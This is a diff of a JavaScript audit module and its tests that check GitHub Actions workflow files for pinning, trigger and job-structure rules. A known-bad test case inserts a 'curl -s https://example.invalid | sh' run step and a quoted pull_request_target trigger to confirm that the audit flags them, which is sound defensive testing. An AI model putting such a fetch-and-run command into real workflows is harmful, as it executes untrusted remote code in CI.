@@ -95,14 +95,33 @@ export function jobNames(text) {
   return m ? (m[1].match(/^  [A-Za-z_][A-Za-z0-9_-]*:\s*$/gm) || []).map((j) => j.trim().replace(':', '')) : [];
 }
 
+// 每個 job 的區塊文字（從 job 標頭到下一個 job 標頭）。
+export function jobBlocks(text) {
+  const m = text.match(/^jobs:\n([\s\S]*)$/m);
+  if (!m) return {};
+  const body = m[1]; const out = {}; let cur = null;
+  for (const l of body.split('\n')) {
+    const h = l.match(/^  ([A-Za-z_][A-Za-z0-9_-]*):\s*$/);
+    if (h) { cur = h[1]; out[cur] = []; continue; }
+    if (cur) out[cur].push(l);
+  }
+  return Object.fromEntries(Object.entries(out).map(([k, v]) => [k, v.join('\n')]));
+}
+
 export function auditPagesWorkflow(text) {
-  const jobs = jobNames(text).length;
-  return [
+  const names = jobNames(text);
+  const problems = [
     ...auditUsesPinning(text),
     ...auditRunsOn(text),
     ...auditSetupNode(text, { expectedSteps: 3 }),
-    ...(jobs === 3 ? [] : [`expected 3 jobs (validate, browser-smoke, deploy), found ${jobs}`]),
+    ...(names.length === 3 ? [] : [`expected 3 jobs (validate, browser-smoke, deploy), found ${names.length}: ${names.join(', ')}`]),
   ];
+  // 每個 job 各自恰好一個 setup-node（審查 Grok F2：全局計數可被「多一個沒有 setup-node 的 job」繞過）
+  for (const [job, block] of Object.entries(jobBlocks(text))) {
+    const n = (block.match(/uses:\s*actions\/setup-node@/g) || []).length;
+    if (n !== 1) problems.push(`job "${job}" must have exactly one setup-node step consuming .node-version, found ${n}`);
+  }
+  return problems;
 }
 
 export function auditPinCheckWorkflow(text) {
@@ -111,7 +130,8 @@ export function auditPinCheckWorkflow(text) {
   const onBlock = text.match(/^on:\n((?:[ \t]+.*\n?)+)/m);
   if (!onBlock) problems.push('no on: block');
   else {
-    const triggers = (onBlock[1].match(/^  ([a-z_]+):/gm) || []).map((t) => t.trim().replace(':', ''));
+    // 鍵可能被引號包住（`"pull_request_target":` 是合法 YAML；審查 Grok F1）→ 去引號後比對
+    const triggers = (onBlock[1].match(/^  ["']?([a-z_]+)["']?:/gm) || []).map((t) => t.trim().replace(/["':]/g, ''));
     const extra = triggers.filter((t) => !['schedule', 'workflow_dispatch'].includes(t));
     if (extra.length) problems.push(`pin-check must only be triggered by schedule/workflow_dispatch, found: ${extra.join(', ')}`);
     if (!triggers.includes('schedule')) problems.push('pin-check lacks a schedule trigger');
@@ -130,7 +150,10 @@ export function auditPinCheckWorkflow(text) {
   if (/\$\{\{\s*secrets\./.test(text) || /GITHUB_TOKEN/.test(text)) problems.push('pin-check must not reference secrets or GITHUB_TOKEN');
   if (/(configure-pages|upload-pages-artifact|deploy-pages|environment:)/.test(text)) problems.push('pin-check must not contain Pages/deploy steps or an environment');
   if (!/^\s*timeout-minutes:\s*\d+/m.test(text)) problems.push('pin-check job lacks timeout-minutes');
-  if (!/run:\s*node scripts\/check-node-pin\.mjs/.test(text)) problems.push('pin-check does not run scripts/check-node-pin.mjs');
+  // run: 步驟白名單（審查 Grok F1：額外 run 步驟 = 額外執行面）：唯一允許的 run 是檢查腳本本身。
+  const runs = lines(text).filter((l) => /^\s*(?:- )?run:/.test(l)).map((l) => l.replace(/^\s*(?:- )?run:\s*/, '').trim());
+  if (runs.length !== 1 || runs[0] !== 'node scripts/check-node-pin.mjs') problems.push(`pin-check may only run "node scripts/check-node-pin.mjs", found: [${runs.join(' | ')}]`);
+  if (jobNames(text).length !== 1) problems.push(`pin-check must have exactly one job, found ${jobNames(text).length}`);
   return problems;
 }
 
@@ -218,8 +241,17 @@ test('CI-6: known-bad arms — each audit rule can actually fail', () => {
   assert.ok(auditNodeVersionFile('v22.23.4\n').some((p) => /exact X\.Y\.Z/.test(p)));
   assert.ok(auditNodeVersionFile('22.23.4\n\n').some((p) => /trailing newline/.test(p)));
   assert.ok(auditNodeVersionFile('22.23.4').some((p) => /trailing newline/.test(p)));
-  // (i) 審查 F3 (b)：多出一個底線 id 的 job → jobNames 看得見 → pages 稽核 RED
-  const extraJob = mutate(PAGES, /\njobs:\n/, '\njobs:\n  extra_job:\n    runs-on: ubuntu-26.04\n    steps:\n      - run: echo hi\n');
-  assert.ok(jobNames(extraJob).includes('extra_job'));
-  assert.ok(auditPagesWorkflow(extraJob).some((p) => /expected 3 jobs/.test(p)));
+  // (i) 審查 F3 (b) + Grok F2：多出一個底線 id、且沒有 setup-node 的 job → jobNames 看得見、job 計數與每 job 檢查皆 RED
+  const extraJob = mutate(PAGES, /\njobs:\n/, '\njobs:\n  pin_audit:\n    runs-on: ubuntu-26.04\n    steps:\n      - run: echo hi\n');
+  assert.ok(jobNames(extraJob).includes('pin_audit'));
+  const extraProblems = auditPagesWorkflow(extraJob);
+  assert.ok(extraProblems.some((p) => /expected 3 jobs/.test(p)));
+  assert.ok(extraProblems.some((p) => /job "pin_audit" must have exactly one setup-node step/.test(p)));
+  // (j) Grok F1：引號觸發鍵 `"pull_request_target":`、額外 run 步驟 → pin-check 稽核 RED
+  const quotedTrig = mutate(PIN_CHECK, /  workflow_dispatch:\n/, '  workflow_dispatch:\n  "pull_request_target":\n    branches: ["main"]\n');
+  assert.ok(auditPinCheckWorkflow(quotedTrig).some((p) => /only be triggered by schedule/.test(p)));
+  const extraRun = mutate(PIN_CHECK, /run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n      - run: curl -s https://example.invalid | sh\n');
+  assert.ok(auditPinCheckWorkflow(extraRun).some((p) => /may only run/.test(p)));
+  const secondJob = mutate(PIN_CHECK, /\njobs:\n/, '\njobs:\n  other:\n    runs-on: ubuntu-26.04\n    steps:\n      - run: node scripts/check-node-pin.mjs\n');
+  assert.ok(auditPinCheckWorkflow(secondJob).some((p) => /exactly one job/.test(p)));
 });
